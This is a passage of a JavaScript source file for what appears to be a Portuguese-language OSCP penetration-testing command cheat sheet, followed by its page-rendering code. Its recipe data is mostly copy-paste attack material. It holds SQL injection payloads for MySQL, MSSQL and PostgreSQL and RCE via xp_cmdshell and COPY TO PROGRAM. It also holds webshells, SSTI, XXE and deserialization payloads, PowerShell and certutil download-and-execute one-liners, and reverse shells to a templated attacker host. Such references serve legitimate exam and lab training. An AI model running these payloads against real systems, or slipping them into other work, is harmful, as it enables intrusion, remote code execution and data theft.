        tag: ["pivot", "chisel"],
        steps: [
          { title: "Server (attacker)", cmd: "chisel server --reverse -p {lport}" },
          { title: "Client SOCKS (victim)", cmd: "chisel client {lhost}:{lport} socks" },
          { title: "Client reverse port forward", cmd: "chisel client {lhost}:{lport} R:8888:{ip}:{port}" }
        ]
      }
    ]
  },

  {
    category: "SQL Injection Manual",
    icon: "üíâ",
    profile: ["oscp", "web"],
    note: "Payloads manuais por DB. OSCP quer prova manual, n√£o s√≥ SQLMap. Sempre identifique o DB antes de atacar.",
    items: [
      {
        name: "Identifica√ß√£o do DB e colunas",
        tag: ["sqli", "enum", "web"],
        note: "Antes de extrair dados, descubra o banco e quantas colunas a query retorna.",
        steps: [
          { title: "Detectar tipo de DB (error-based)", cmd: "# MySQL: ' AND 1=CONVERT(int,@@version)-- -\n# MSSQL: ' AND 1=CONVERT(int,@@version)-- -\n# PostgreSQL: ' AND 1=CAST(version() AS int)-- -\n# Ou observe mensagens de erro que revelam o banco" },
          { title: "ORDER BY (achar n√∫mero de colunas)", cmd: "' ORDER BY 1-- -\n' ORDER BY 2-- -\n' ORDER BY 3-- -\n# Incrementar at√© dar erro, o √∫ltimo v√°lido √© o total" },
          { title: "UNION SELECT NULL (confirmar colunas)", cmd: "' UNION SELECT NULL-- -\n' UNION SELECT NULL,NULL-- -\n' UNION SELECT NULL,NULL,NULL-- -\n# Ajuste NULLs at√© n√£o dar erro" },
          { title: "Identificar colunas vis√≠veis", cmd: "' UNION SELECT 'aaa','bbb','ccc'-- -\n# Veja quais valores aparecem na resposta" }
        ]
      },

      {
        name: "MySQL: Union-based",
        tag: ["sqli", "mysql", "union", "web"],
        note: "Payloads para MySQL. Ajuste n√∫mero de colunas conforme enum pr√©via.",
        steps: [
          { title: "Vers√£o", cmd: "' UNION SELECT version(),NULL,NULL-- -" },
          { title: "Usu√°rio atual", cmd: "' UNION SELECT user(),NULL,NULL-- -" },
          { title: "Banco atual", cmd: "' UNION SELECT database(),NULL,NULL-- -" },
          { title: "Listar bancos", cmd: "' UNION SELECT GROUP_CONCAT(schema_name),NULL,NULL FROM information_schema.schemata-- -" },
          { title: "Listar tabelas do banco", cmd: "' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -" },
          { title: "Listar colunas de uma tabela", cmd: "' UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -" },
          { title: "Extrair dados", cmd: "' UNION SELECT GROUP_CONCAT(username,0x3a,password),NULL,NULL FROM users-- -" },
          { title: "Ler arquivo (se FILE priv)", cmd: "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- -" },
          { title: "Escrever webshell (se FILE priv + caminho conhecido)", cmd: "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'-- -" }
        ]
      },

      {
        name: "MySQL: Error-based e Blind",
        tag: ["sqli", "mysql", "blind", "web"],
        steps: [
          { title: "Error-based (extractvalue)", cmd: "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- -" },
          { title: "Error-based (updatexml)", cmd: "' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)-- -" },
          { title: "Boolean blind (true/false)", cmd: "' AND SUBSTRING(version(),1,1)='5'-- -\n' AND SUBSTRING(version(),1,1)='8'-- -\n# Itere caractere por caractere" },
          { title: "Time-based blind", cmd: "' AND IF(SUBSTRING(version(),1,1)='5',SLEEP(3),0)-- -\n# Se demorar 3s, condi√ß√£o √© verdadeira" }
        ]
      },

      {
        name: "MSSQL: Union-based",
        tag: ["sqli", "mssql", "union", "web"],
        note: "MSSQL usa TOP, n√£o LIMIT. information_schema funciona mas sysobjects tamb√©m.",
        steps: [
          { title: "Vers√£o", cmd: "' UNION SELECT @@version,NULL,NULL-- -" },
          { title: "Usu√°rio atual", cmd: "' UNION SELECT SYSTEM_USER,NULL,NULL-- -" },
          { title: "Banco atual", cmd: "' UNION SELECT DB_NAME(),NULL,NULL-- -" },
          { title: "Listar bancos", cmd: "' UNION SELECT name,NULL,NULL FROM master.dbo.sysdatabases-- -" },
          { title: "Listar tabelas", cmd: "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- -" },
          { title: "Listar colunas", cmd: "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -" },
          { title: "Extrair dados", cmd: "' UNION SELECT username+':'+password,NULL,NULL FROM users-- -" },
          { title: "Checar se sysadmin", cmd: "' UNION SELECT CONVERT(varchar,IS_SRVROLEMEMBER('sysadmin')),NULL,NULL-- -" }
        ]
      },

      {
        name: "MSSQL: xp_cmdshell (RCE)",
        tag: ["sqli", "mssql", "rce", "web"],
        note: "Se for sysadmin (ou conseguir virar), xp_cmdshell √© RCE direto. Super comum em OSCP.",
        steps: [
          { title: "Habilitar xp_cmdshell", cmd: "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;-- -\n'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -" },
          { title: "Testar execu√ß√£o", cmd: "'; EXEC xp_cmdshell 'whoami';-- -" },
          { title: "Reverse shell (PowerShell)", cmd: "'; EXEC xp_cmdshell 'powershell -e BASE64_PAYLOAD_HERE';-- -" },
          { title: "Download + exec (certutil)", cmd: "'; EXEC xp_cmdshell 'certutil -urlcache -split -f http://{lhost}:{lport}/rev.exe C:\\Windows\\Temp\\rev.exe && C:\\Windows\\Temp\\rev.exe';-- -" },
          { title: "Via stacked queries (se UNION n√£o funcionar)", cmd: "'; EXEC xp_cmdshell 'whoami > C:\\Windows\\Temp\\output.txt';-- -\n# Depois leia o arquivo com outra t√©cnica" },
          { title: "Alternativa: EXEC via impacket direto", cmd: "mssqlclient.py {domain}/{user}:\"{pass}\"@{ip} -windows-auth\n# Dentro do prompt:\nenable_xp_cmdshell\nxp_cmdshell whoami" }
        ]
      },

      {
        name: "MSSQL: Error-based e Blind",
        tag: ["sqli", "mssql", "blind", "web"],
        steps: [
          { title: "Error-based (CONVERT)", cmd: "' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))-- -" },
          { title: "Error-based (CAST)", cmd: "' AND 1=CAST((SELECT TOP 1 password FROM users) AS int)-- -" },
          { title: "Boolean blind", cmd: "' AND SUBSTRING((SELECT TOP 1 username FROM users),1,1)='a'-- -" },
          { title: "Time-based blind", cmd: "'; IF(SUBSTRING((SELECT TOP 1 username FROM users),1,1)='a') WAITFOR DELAY '0:0:3';-- -" }
        ]
      },

      {
        name: "PostgreSQL: Union-based",
        tag: ["sqli", "postgresql", "union", "web"],
        note: "PostgreSQL usa || para concat e tem fun√ß√µes √∫teis para RCE.",
        steps: [
          { title: "Vers√£o", cmd: "' UNION SELECT version(),NULL,NULL-- -" },
          { title: "Usu√°rio atual", cmd: "' UNION SELECT current_user,NULL,NULL-- -" },
          { title: "Banco atual", cmd: "' UNION SELECT current_database(),NULL,NULL-- -" },
          { title: "Listar bancos", cmd: "' UNION SELECT datname,NULL,NULL FROM pg_database-- -" },
          { title: "Listar tabelas", cmd: "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='public'-- -" },
          { title: "Listar colunas", cmd: "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -" },
          { title: "Extrair dados", cmd: "' UNION SELECT username||':'||password,NULL,NULL FROM users-- -" },
          { title: "Ler arquivo", cmd: "' UNION SELECT pg_read_file('/etc/passwd'),NULL,NULL-- -" }
        ]
      },

      {
        name: "PostgreSQL: RCE",
        tag: ["sqli", "postgresql", "rce", "web"],
        note: "Se for superuser, pode executar comandos via COPY TO PROGRAM ou extens√µes.",
        steps: [
          { title: "Checar se superuser", cmd: "' UNION SELECT CAST(usesuper AS text),NULL,NULL FROM pg_user WHERE usename=current_user-- -" },
          { title: "RCE via COPY TO PROGRAM (9.3+)", cmd: "'; COPY cmd_output FROM PROGRAM 'id';-- -" },
          { title: "RCE via tabela + COPY", cmd: "'; CREATE TABLE IF NOT EXISTS cmd_output(line text);-- -\n'; COPY cmd_output FROM PROGRAM 'whoami';-- -\n' UNION SELECT line,NULL,NULL FROM cmd_output-- -" },
          { title: "Reverse shell via COPY", cmd: "'; COPY cmd_output FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"';-- -" }
        ]
      },

      {
        name: "SQLi bypass de filtros comuns",
        tag: ["sqli", "bypass", "waf", "web"],
        note: "Quando espa√ßos, aspas ou keywords s√£o filtrados.",
        steps: [
          { title: "Sem espa√ßos (usar coment√°rios)", cmd: "'/**/UNION/**/SELECT/**/NULL,NULL,NULL-- -" },
          { title: "Sem aspas (usar hex)", cmd: "' UNION SELECT * FROM users WHERE username=0x61646d696e-- -\n# 0x61646d696e = 'admin' em hex" },
          { title: "Case variation", cmd: "' uNiOn SeLeCt NULL,NULL,NULL-- -" },
          { title: "Double URL encoding", cmd: "%2527%2520UNION%2520SELECT%2520NULL-- -" },
          { title: "Coment√°rios de final variados", cmd: "' UNION SELECT NULL,NULL,NULL-- -\n' UNION SELECT NULL,NULL,NULL#\n' UNION SELECT NULL,NULL,NULL/*\n') UNION SELECT NULL,NULL,NULL-- -" }
        ]
      }
    ]
  },

  {
    category: "Web Exploitation",
    icon: "üéØ",
    profile: ["oscp", "web"],
    note: "Vulns web comuns al√©m de SQLi e LFI. Command injection, SSTI, SSRF, deserialization.",
    items: [
      {
        name: "Command Injection",
        tag: ["web", "cmdi", "rce"],
        note: "Quando input do user √© passado para shell/exec. Teste separadores comuns.",
        steps: [
          { title: "Separadores comuns", cmd: "# Tente ap√≥s o par√¢metro vulner√°vel:\n; whoami\n| whoami\n|| whoami\n& whoami\n&& whoami\n$(whoami)\n`whoami`" },
          { title: "Blind (callback)", cmd: "# Se n√£o v√™ output, confirme com callback:\n; curl http://{lhost}:{lport}/cmdi_confirm\n| wget http://{lhost}:{lport}/cmdi_confirm\n; ping -c 3 {lhost}" },
          { title: "Blind (time-based)", cmd: "; sleep 5\n| sleep 5\n& ping -c 5 127.0.0.1 &" },
          { title: "Reverse shell via cmdi", cmd: "; bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\n| bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'" },
          { title: "Bypass filtros comuns", cmd: "# Se espa√ßos filtrados: use $IFS ou {cmd,arg}\ncat${IFS}/etc/passwd\n{cat,/etc/passwd}\n# Se keywords filtradas: use vari√°veis\na=who;b=ami;$a$b\n# Newline injection: %0a, %0d%0a" }
        ]
      },
      {
        name: "SSTI (Server-Side Template Injection)",
        tag: ["web", "ssti", "rce"],
        note: "Comum em Flask/Jinja2, Twig, Freemarker. Teste com payloads aritm√©ticos.",
        steps: [
          { title: "Detectar SSTI (payloads gen√©ricos)", cmd: "# Insira em qualquer campo/par√¢metro refletido:\n{{7*7}}\n${7*7}\n<%= 7*7 %>\n#{7*7}\n# Se retornar 49, SSTI confirmado" },
          { title: "Jinja2/Flask (Python) ‚Äî RCE", cmd: "# Listar classes dispon√≠veis:\n{{''.__class__.__mro__[1].__subclasses__()}}\n\n# RCE via subprocess.Popen (index varia, procure 'Popen'):\n{{''.__class__.__mro__[1].__subclasses__()[INDEX]('whoami',shell=True,stdout=-1).communicate()[0]}}\n\n# Alternativa direta:\n{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}" },
          { title: "Twig (PHP) ‚Äî RCE", cmd: "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('whoami')}}" },
          { title: "Freemarker (Java) ‚Äî RCE", cmd: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"whoami\")}" }
        ]
      },
      {
        name: "SSRF (Server-Side Request Forgery)",
        tag: ["web", "ssrf"],
        note: "Quando o servidor faz requests controladas por voc√™. √ötil para acessar servi√ßos internos.",
        steps: [
          { title: "Detectar SSRF (callback)", cmd: "# No par√¢metro de URL/fetch:\nhttp://{lhost}:{lport}/ssrf_test\n# Se receber hit no listener, SSRF confirmado" },
          { title: "Acessar localhost", cmd: "http://127.0.0.1/\nhttp://127.0.0.1:8080/\nhttp://localhost/admin\nhttp://0.0.0.0/" },
          { title: "Port scan interno via SSRF", cmd: "# Teste portas comuns via par√¢metro:\nhttp://127.0.0.1:22/\nhttp://127.0.0.1:3306/\nhttp://127.0.0.1:5985/\nhttp://127.0.0.1:6379/" },
          { title: "Bypass filtros", cmd: "# Decimal: http://2130706433/ (= 127.0.0.1)\n# Hex: http://0x7f000001/\n# Redirecionamento: use seu server para 302 para localhost\n# IPv6: http://[::1]/" },
          { title: "Ler arquivo (file://)", cmd: "file:///etc/passwd\nfile:///c:/windows/win.ini" }
        ]
      },
      {
        name: "Deserialization (overview)",
        tag: ["web", "deserial", "rce"],
        note: "Quando input serializado √© processado sem valida√ß√£o. Comum em Java, PHP, Python, .NET.",
        steps: [
          { title: "Sinais de deserialization", cmd: "# PHP: dados come√ßando com O:, a:, s: (ex: O:4:\"User\":2:{...})\n# Java: bytes come√ßando com AC ED 00 05 (ou base64 rO0AB...)\n# Python: m√≥dulo pickle, dados bin√°rios ou base64\n# .NET: ViewState, TypeNameHandling em JSON, BinaryFormatter" },
          { title: "PHP deserialization", cmd: "# Se controlar input serializado:\n# Procure classes com __wakeup(), __destruct(), __toString()\n# Gere payload com phpggc (se framework conhecido):\nphpggc Laravel/RCE1 system 'whoami' -b" },
          { title: "Java deserialization (ysoserial)", cmd: "java -jar ysoserial.jar CommonsCollections1 'whoami' | base64 -w0\n# Ou:\njava -jar ysoserial.jar CommonsCollections4 'bash -c {echo,BASE64REVSHELL}|{base64,-d}|{bash,-i}'" },
          { title: "Python pickle", cmd: "# Se input √© pickle, gere payload:\nimport pickle,os\nclass Exploit:\n  def __reduce__(self):\n    return (os.system, ('whoami',))\npickle.dumps(Exploit())" }
        ]
      },
      {
        name: "XXE (XML External Entity)",
        tag: ["web", "xxe", "lfi"],
        note: "Quando o app processa XML do user. Pode ler arquivos e fazer SSRF.",
        steps: [
          { title: "Payload b√°sico (ler arquivo)", cmd: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>" },
          { title: "XXE via SSRF", cmd: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"http://{lhost}:{lport}/xxe_test\">\n]>\n<root>&xxe;</root>" },
          { title: "Blind XXE (out-of-band)", cmd: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY % xxe SYSTEM \"http://{lhost}:{lport}/evil.dtd\">\n  %xxe;\n]>\n<root>test</root>" },
          { title: "Windows (ler arquivo)", cmd: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">\n]>\n<root>&xxe;</root>" }
        ]
      },
      {
        name: "File upload ‚Üí RCE",
        tag: ["web", "upload", "rce"],
        note: "Quando upload √© permitido e voc√™ consegue executar o arquivo subido.",
        steps: [
          { title: "PHP webshell simples", cmd: "<?php system($_GET['cmd']); ?>\n# Salvar como shell.php e subir" },
          { title: "Bypass extens√£o", cmd: "# Extens√µes alternativas:\nshell.php5\nshell.phtml\nshell.phar\nshell.php.jpg\nshell.php%00.jpg (null byte, PHP < 5.3.4)\nshell.PhP (case variation)" },
          { title: "Bypass content-type", cmd: "# Mude Content-Type no request para:\nimage/jpeg\nimage/png\napplication/octet-stream" },
          { title: "Bypass magic bytes", cmd: "# Adicione magic bytes de imagem no in√≠cio do PHP:\nGIF89a<?php system($_GET['cmd']); ?>\n# Ou use exiftool para injetar em imagem real:\nexiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' photo.jpg -o shell.php.jpg" },
          { title: "ASP/ASPX webshell", cmd: "# ASP:\n<% eval request(\"cmd\") %>\n# ASPX: use msfvenom ou web shell do SecLists:\n/usr/share/webshells/aspx/cmdasp.aspx" },
          { title: "JSP webshell", cmd: "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>" }
        ]
      }
    ]
  },

  {
    category: "Shell Upgrades & Payloads",
    icon: "üêö",
    profile: ["oscp", "web", "ad"],
    note: "Payloads e t√©cnicas para obter e melhorar shells. Tenha 3+ op√ß√µes prontas.",
    items: [
      {
        name: "Windows: download + execute (one-liners)",
        tag: ["shell", "windows", "payload"],
        note: "Padr√£o mais usado: servir payload via HTTP e executar no alvo.",
        steps: [
          { title: "PowerShell IEX (in-memory, sem tocar disco)", cmd: "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/shell.ps1')\"" },
          { title: "PowerShell download + exec", cmd: "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://{lhost}:{lport}/rev.exe','C:\\Windows\\Temp\\rev.exe'); Start-Process 'C:\\Windows\\Temp\\rev.exe'\"" },
          { title: "Certutil + exec", cmd: "certutil -urlcache -split -f http://{lhost}:{lport}/rev.exe C:\\Windows\\Temp\\rev.exe && C:\\Windows\\Temp\\rev.exe" },
          { title: "PowerShell base64 encoded command", cmd: "# No attacker, gere o base64:\n# echo -n 'IEX(New-Object Net.WebClient).DownloadString(\"http://{lhost}:{lport}/shell.ps1\")' | iconv -t UTF-16LE | base64 -w0\n# No alvo:\npowershell -ep bypass -enc BASE64_STRING_HERE" }
        ]
      },
      {
        name: "Windows: Nishang / ConPtyShell",
        tag: ["shell", "windows", "nishang"],
        note: "Scripts PowerShell populares para reverse shell interativa.",
        steps: [
          { title: "Invoke-PowerShellTcp (Nishang)", cmd: "# 1. Copie Invoke-PowerShellTcp.ps1 para seu diret√≥rio de serve\n# 2. Adicione no final do .ps1:\n#    Invoke-PowerShellTcp -Reverse -IPAddress {lhost} -Port {lport}\n# 3. No alvo:\npowershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/Invoke-PowerShellTcp.ps1')\"" },
          { title: "ConPtyShell (full interactive)", cmd: "# Attacker: stty raw -echo; (stty size; cat) | nc -lvnp {lport}\n# Alvo:\npowershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell -RemoteIp {lhost} -RemotePort {lport} -Rows 40 -Cols 160\"" }
        ]
      },
      {
        name: "Linux: shell upgrades avan√ßados",
        tag: ["shell", "linux", "tty"],
        note: "Quando python n√£o existe ou o upgrade b√°sico n√£o funciona.",
        steps: [
          { title: "Script (quando python n√£o existe)", cmd: "script -qc /bin/bash /dev/null\n# Depois: Ctrl+Z ‚Üí stty raw -echo; fg ‚Üí export TERM=xterm" },
          { title: "Perl", cmd: "perl -e 'exec \"/bin/bash\";'" },
          { title: "Expect", cmd: "expect -c 'spawn bash; interact'" },
          { title: "Socat full TTY (melhor op√ß√£o se dispon√≠vel)", cmd: "# Attacker:\nsocat file:`tty`,raw,echo=0 tcp-listen:{lport}\n# Victim:\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}" },
          { title: "Rlwrap (atacante - melhora readline)", cmd: "rlwrap nc -lvnp {lport}" }
        ]
      },
      {
        name: "Payloads adicionais (msfvenom)",
        tag: ["shell", "payload", "msfvenom"],
        note: "Payloads extras para cen√°rios espec√≠ficos.",
        steps: [
          { title: "Windows staged (meterpreter)", cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o meterpreter.exe" },
          { title: "Windows DLL (para DLL hijack)", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f dll -o hijack.dll" },
          { title: "Linux SO (para LD_PRELOAD)", cmd: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf-so -o preload.so" },
          { title: "WAR (Tomcat)", cmd: "msfvenom -p java/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f war -o shell.war\n# Deploy via Tomcat manager: curl -u 'user:pass' --upload-file shell.war {url}/manager/text/deploy?path=/shell" },
          { title: "Python reverse shell (one-liner)", cmd: "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'" },
          { title: "Perl reverse shell", cmd: "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'" }
        ]
      }
    ]
  },

  {
    category: "Hashcat Quick Reference",
    icon: "üî¢",
    profile: ["oscp", "web", "ad"],
    note: "Modos mais comuns do hashcat. Identifique o hash, ache o modo, crack.",
    items: [
      {
        name: "Identifica√ß√£o de hash",
        tag: ["crack", "hash", "identify"],
        note: "Use hashid ou hash-identifier para ajudar. Mas aprenda os padr√µes visuais.",
        steps: [
          { title: "hashid", cmd: "hashid 'HASH_AQUI'" },
          { title: "hash-identifier", cmd: "hash-identifier\n# Cole o hash quando pedir" },
          { title: "Padr√µes visuais comuns", cmd: "# 32 chars hex = MD5 ou NTLM\n# 40 chars hex = SHA1\n# 64 chars hex = SHA256\n# $1$ = MD5 (Unix)\n# $2a$/$2b$ = bcrypt\n# $5$ = SHA256 (Unix)\n# $6$ = SHA512 (Unix)\n# $krb5asrep$ = AS-REP\n# $krb5tgs$ = Kerberoast\n# NTLMv2: user::domain:challenge:hash:blob" }
        ]
      },
      {
        name: "Modos hashcat (OSCP essenciais)",
        tag: ["crack", "hashcat", "modes"],
        note: "Refer√™ncia r√°pida dos modos (-m) mais usados.",
        steps: [
          { title: "Hashes simples", cmd: "# -m 0     = MD5\n# -m 100   = SHA1\n# -m 1400  = SHA256\n# -m 1700  = SHA512\n# -m 3200  = bcrypt ($2a$, $2b$, $2y$)\n# -m 500   = MD5 Unix ($1$)\n# -m 1800  = SHA512 Unix ($6$)\n# -m 7400  = SHA256 Unix ($5$)" },
          { title: "Windows / AD", cmd: "# -m 1000  = NTLM\n# -m 3000  = LM\n# -m 5500  = NTLMv1 (Net-NTLMv1)\n# -m 5600  = NTLMv2 (Net-NTLMv2 / Responder)\n# -m 13100 = Kerberoast (TGS-REP etype 23)\n# -m 18200 = AS-REP Roast (etype 23)\n# -m 19600 = Kerberos 5 TGS-REP etype 17 (AES128)\n# -m 19700 = Kerberos 5 TGS-REP etype 18 (AES256)" },
          { title: "Web / Apps", cmd: "# -m 1600  = Apache $apr1$ MD5\n# -m 400   = WordPress (phpass)\n# -m 7900  = Drupal7\n# -m 1500  = DES (Unix)\n# -m 16500 = JWT (HMAC-SHA256)" },
          { title: "Outros comuns", cmd: "# -m 13400 = KeePass KDBX\n# -m 22000 = WPA-PBKDF2-PMKID+EAPOL\n# -m 11600 = 7-Zip\n# -m 13600 = WinZip\n# -m 9600  = MS Office 2013\n# -m 9700  = MS Office 97-03" }
        ]
      },
      {
        name: "Exemplos de uso r√°pido",
        tag: ["crack", "hashcat", "examples"],
        note: "Copy-paste. Ajuste -m e arquivo conforme o caso.",
        steps: [
          { title: "B√°sico com wordlist", cmd: "hashcat -m {mode} {hashfile} {wordlist} --force" },
          { title: "Com regras (best64)", cmd: "hashcat -m {mode} {hashfile} {wordlist} -r /usr/share/hashcat/rules/best64.rule --force" },
          { title: "Com regras (OneRuleToRuleThemAll)", cmd: "hashcat -m {mode} {hashfile} {wordlist} -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule --force" },
          { title: "Mostrar resultados", cmd: "hashcat -m {mode} {hashfile} --show" },
          { title: "NTLM r√°pido", cmd: "hashcat -m 1000 {hashfile} {wordlist} --force" },
          { title: "NTLMv2 (Responder)", cmd: "hashcat -m 5600 {hashfile} {wordlist} --force" },
          { title: "Kerberoast", cmd: "hashcat -m 13100 {hashfile} {wordlist} --force" },
          { title: "AS-REP Roast", cmd: "hashcat -m 18200 {hashfile} {wordlist} --force" },
          { title: "John equivalente (quando hashcat n√£o rola)", cmd: "john --wordlist={wordlist} {hashfile}\njohn --show {hashfile}" }
        ]
      }
    ]
  }
];


function getRecipes() {
  const stored = loadJSON(STORE.recipes, null);
  return Array.isArray(stored) && stored.length ? stored : DEFAULT_RECIPES;
}

function setRecipes(recipes) {
  saveJSON(STORE.recipes, recipes);
}

let activeTag = "";
let allExpanded = false;

function buildTagSet(recipes) {
  const tags = new Set();
  recipes.forEach(g => g.items.forEach(it => (it.tag || []).forEach(t => tags.add(t))));
  return Array.from(tags).sort((a, b) => a.localeCompare(b));
}

function renderTagChips(tags) {
  els.quickTags.innerHTML = "";

  const mk = (label, isActive, onClick) => {
    const b = document.createElement("button");
    b.className = `chip ${isActive ? "active" : ""}`;
    b.textContent = label;
    b.addEventListener("click", onClick);
    return b;
  };

  els.quickTags.appendChild(mk("all", !activeTag, () => {
    activeTag = "";
    renderCommands();
  }));

  tags.slice(0, 18).forEach(t => {
    els.quickTags.appendChild(mk(t, activeTag === t, () => {
      activeTag = (activeTag === t) ? "" : t;
      renderCommands();
    }));
  });
}

function setTab(tab) {
  els.tabs.forEach(b => {
    const active = b.dataset.tab === tab;
    b.classList.toggle("active", active);
    b.setAttribute("aria-selected", active ? "true" : "false");
  });

  Object.entries(els.views).forEach(([k, v]) => {
    v.classList.toggle("active", k === tab);
  });
}

function setToggleAllLabel() {
  els.btnToggleAll.textContent = allExpanded ? "Collapse sections" : "Expand sections";
}

function expandAll(open) {
  const sections = Array.from(document.querySelectorAll(".section"));
  sections.forEach(sec => {
    const body = sec.querySelector(".sectionBody");
    sec.dataset.open = open ? "true" : "false";
    body.style.display = open ? "grid" : "none";
  });
  allExpanded = open;
  setToggleAllLabel();
}

function normalizeSteps(item) {
  if (Array.isArray(item.steps) && item.steps.length) return item.steps;
  if (item.cmd) return [{ title: item.name || "Command", cmd: item.cmd }];
  return [];
}

function sectionEl(group, values, query, profile, tag) {
  const section = document.createElement("div");
  section.className = "section";
  section.dataset.open = "false";
  section.dataset.accent = stableAccentKey(group.category || "x");
  section.dataset.key = group.category || "";

  const head = document.createElement("div");
  head.className = "sectionHead";

  const left = document.createElement("div");
  left.className = "sectionTitle";
  left.innerHTML = `<span>${group.icon || "‚Ä¢"}</span><span>${escapeHtml(group.category)}</span>`;

  const badge = document.createElement("span");
  badge.className = "badge";

  const chev = document.createElement("span");
  chev.className = "chev";
  chev.textContent = "‚ñæ";

  head.appendChild(left);
  head.appendChild(badge);
  head.appendChild(chev);

  const body = document.createElement("div");
  body.className = "sectionBody";
  body.style.display = "none";

  const groupAllowed = !group.profile || group.profile.includes(profile) || profile === "all";

  const q = (query || "").trim().toLowerCase();

  const items = (group.items || [])
    .map(it => {
      const steps = normalizeSteps(it).map(s => {
        const cmdPlain = renderCmdPlain(s.cmd, values);
        const cmdHtml = renderCmdHighlightedSafe(s.cmd, values);
        return { ...s, cmdPlain, cmdHtml };
      });
      return { ...it, steps };
    })
    .filter(it => {
      if (!groupAllowed) return false;
      if (tag) {
        const tags = it.tag || [];
        if (!tags.includes(tag)) return false;
      }
      if (!q) return true;

      const hay = [
        it.name || "",
        (it.tag || []).join(" "),
        group.category || "",
        (it.note || ""),
        it.steps.map(s => `${s.title || ""} ${s.cmdPlain || ""}`).join(" ")
      ].join(" ").toLowerCase();

      return hay.includes(q);
    });

  badge.textContent = `${items.length} blocks`;

  if (group.note) {
    const n = document.createElement("div");
    n.className = "note";
    n.textContent = group.note;
    body.appendChild(n);
  }

  items.forEach(it => {
    const itemWrap = document.createElement("div");
    itemWrap.className = "itemWrap";

    const header = document.createElement("div");
    header.className = "itemHeader";

    const title = document.createElement("div");
    title.className = "itemHeaderTitle";
    title.textContent = it.name || "Block";

    const tags = document.createElement("div");
    tags.className = "itemHeaderTags";

    const firstTag = (it.tag && it.tag[0]) ? it.tag[0] : group.category;
    const tagEl = document.createElement("span");
    tagEl.className = "tag";
    tagEl.textContent = firstTag;
    tags.appendChild(tagEl);

    header.appendChild(title);
    header.appendChild(tags);

    itemWrap.appendChild(header);

    if (it.note) {
      const note = document.createElement("div");
      note.className = "note";
      note.textContent = it.note;
      itemWrap.appendChild(note);
    }

    it.steps.forEach(step => {
      if (step.title) {
        const st = document.createElement("div");
        st.className = "stepTitle";
        st.textContent = step.title;
        itemWrap.appendChild(st);
      }

      const card = document.createElement("div");
      card.className = "cmdCard";

      const top2 = document.createElement("div");
      top2.className = "cmdCardTop";

      const t = document.createElement("div");
      t.className = "title";
      t.textContent = "Command";

      const btn2 = document.createElement("button");
      btn2.className = "btn";
      btn2.textContent = "Copy";
      btn2.addEventListener("click", () => copy(step.cmdPlain));

      top2.appendChild(t);
      top2.appendChild(btn2);

      const code2 = document.createElement("div");
      code2.className = "code";
      applyCodeSpacingEl(code2);
      code2.innerHTML = toSpacedLinesHtml(step.cmdHtml);

      card.appendChild(top2);
      card.appendChild(code2);

      itemWrap.appendChild(card);
    });

    body.appendChild(itemWrap);
  });

  head.addEventListener("click", () => {
    const isOpen = section.dataset.open === "true";
    section.dataset.open = (!isOpen).toString();
    body.style.display = isOpen ? "none" : "grid";
  });

  section.appendChild(head);
  section.appendChild(body);
  return section;
}

function renderCommands() {
  const prevOpen = snapshotOpenSections(els.commandsContainer);

  const base = getValues();
  const values = computeDerived(base);

  if (!els.url.value.trim()) els.url.value = values.url;

  saveJSON(STORE.values, values);

  const q = (els.cmdSearch.value || "").trim();
  const profile = values.profile || "all";
  const recipes = getRecipes();

  els.commandsContainer.innerHTML = "";

  recipes.forEach(group => {
